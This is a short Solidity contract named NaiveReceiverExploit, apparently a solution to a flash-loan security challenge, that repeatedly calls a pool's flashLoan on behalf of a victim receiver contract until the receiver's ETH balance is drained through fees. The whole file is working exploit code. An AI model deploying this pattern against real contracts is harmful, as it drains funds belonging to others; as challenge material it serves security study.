// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "./FlashLoanReceiver.sol";

/**
 * @title NaiveReceiverExploit
 * @author scorpion9979
 */
contract NaiveReceiverExploit {
    IERC3156FlashLender public immutable POOL;
    IERC3156FlashBorrower public immutable RECEIVER;
    address public immutable ETH;

    constructor(
        IERC3156FlashLender POOL_,
        IERC3156FlashBorrower RECEIVER_,
        address ETH_
    ) {
        POOL = POOL_;
        RECEIVER = RECEIVER_;
        ETH = ETH_;
    }

    function exploit() external {
        while (address(RECEIVER).balance > 0) {
            POOL.flashLoan(RECEIVER, ETH, 0, "0x");
        }
    }

    // Allow deposits of ETH
    receive() external payable {}
}
